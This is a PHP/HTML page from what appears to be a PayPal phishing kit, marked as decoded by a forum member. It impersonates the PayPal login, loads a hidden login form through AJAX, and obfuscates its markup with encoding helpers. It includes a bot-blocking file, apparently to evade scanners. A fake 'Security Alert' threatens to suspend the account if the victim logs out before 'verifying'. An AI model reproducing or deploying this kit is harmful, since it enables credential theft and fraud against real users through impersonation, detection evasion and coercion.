<?php
// Decoded by Girudatsu.com Member
include 'inc/bots.php';
include 'inc/crypt.php';
echo '<!' . xCrypt(117 + -17, 367 + 133) . '>';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<?php
echo '<!' . xCrypt(62 - -38, 959 - 459) . '>';
?>
  <meta charset="<?php
echo xTextEncode('utf-8');
?>
">
  <title><?php
echo xTextEncode('Log in to your PayPal account');
?>
</title>
<?php
echo '<!' . xCrypt(162 + -62, 184 + 316) . '>';
?>
  <meta name="<?php
echo xTextEncode('description');
?>
" content="Jembut">
<?php
echo '<!' . xCrypt(16 + 84, 853 - 353) . '>';
?>
  <meta name="<?php
echo xTextEncode('author');
?>
" content="Jembut">
<?php
echo '<!' . xCrypt(138 - 38, 516 - 16) . '>';
?>
  <meta http-equiv="<?php
echo xTextEncode('x-ua-compatible');
?>
" content="<?php
echo xTextEncode('ie=edge');
?>
">
<?php
echo '<!' . xCrypt(171 + -71, 416 - -84) . '>';
?>
  <meta name="<?php
echo xTextEncode('viewport');
?>
" content="<?php
echo xTextEncode('width=device-width, initial-scale=1');
?>
">
<?php
'<!' . xCrypt(65 + 35, 694 - 194) . '>';
?>
  <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/jquery.min.js');
?>
"></script>
<?php
echo '<!' . xCrypt(6 + 94, 402 + 98) . '>';
?>
  <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/jstz.min.js');
?>
"></script>
<?php
echo '<!' . xCrypt(78 - -22, 141 + 359) . '>';
?>
  <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/jquery.mobile.custom.min.js');
?>
"></script>
<?php
echo '<!' . xCrypt(129 - 29, 437 + 63) . '>';
?>
  <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/jquery.browser.min.js');
?>
"></script>
<?php
echo '<!' . xCrypt(69 + 31, 200 + 300) . '>';
?>
<script type="text/javascript">$("#ajax").css('opacity','0');setTimeout(function(){$("#ajax").load("login.php",null,function(){$("#ajax").animate({opacity:'1'},100);});},100);</script>
  <link rel="<?php
echo xTextEncode('icon');
?>
" type="<?php
echo xTextEncode('image/png');
?>
" href="<?php
echo xTextEncode('img/favicon.ico');
?>
">
</head>
<body>
  <div id="<?php
echo xTextEncode('loader');
?>
" class="<?php
echo xCrypt(-63 - -73, 84 - 34);
?>
 spinner <?php
echo xCrypt(6 - -4, 90 + -40);
?>
">
    <p id="<?php
echo xTextEncode('loading_title');
?>
"><?php
echo xTextEncode('Verifying your information…');
?>
</p>
  </div>
<?php
echo '<!' . xCrypt(21 + 79, 642 - 142) . '>';
?>
  <div id="<?php
echo xTextEncode('ajax');
?>
">
<?php
echo '<!' . xCrypt(101 + -1, 52 + 448) . '>';
?>
  </div>
<?php
echo '<!' . xCrypt(186 + -86, 566 - 66) . '>';
?>

  <div id="<?php
echo xTextEncode('ajax_alert_back');
?>
"></div>
  <div id="<?php
echo xTextEncode('ajax_alert');
?>
">
    <div id="<?php
echo xTextEncode('title_alert');
?>
"><?php
echo xTextEncode('Security Alert!');
?>
</div>
<?php
echo '<!' . xCrypt(14 + 86, 63 + 437) . '>';
?>
    <div id="<?php
echo xTextEncode('text_alert');
?>
"><?php
echo xTextEncode('For security reason, if you logout from your account we\'ll consider that you are avoiding these verification requirement,');
?>
<br><?php
echo xTextEncode('So we\'ll suspend that account if you are unable to verify that you are the account owner.');
?>
</div>
    <!-- <div id="text_alert">Sorry, but you can't access the account features while you didn't verified as an owner of the account.</div> -->
<?php
echo '<!' . xCrypt(180 + -80, 918 - 418) . '>';
?>
    <button type="<?php
echo xTextEncode('button');
?>
" id="<?php
echo xTextEncode('alert_cancel');
?>
" class="<?php
echo xCrypt(-81 - -91, 33 + 17);
?>
 <?php
echo xTextEncode('u-pull-right');
?>
 <?php
echo xCrypt(2 - -8, 95 + -45);
?>
 <?php
echo xTextEncode('button-primary');
?>
 <?php
echo xCrypt(-44 - -54, 112 + -62);
?>
" style="margin-right:10px;margin-top:0px;">Cancel</button>
    <button type="<?php
echo xTextEncode('button');
?>
" id="<?php
echo xTextEncode('alert_logout');
?>
" class="<?php
echo xCrypt(45 + -35, 125 + -75);
?>
 <?php
echo xTextEncode('u-pull-right');
?>
 <?php
echo xCrypt(2 + 8, 108 + -58);
?>
" style="<?php
echo xTextEncode('margin-right:10px;');
?>
">Logout</button>
  </div>
<?php
echo '<!' . xCrypt(60 - -40, 965 - 465) . '>';
?>
</body>
</html>
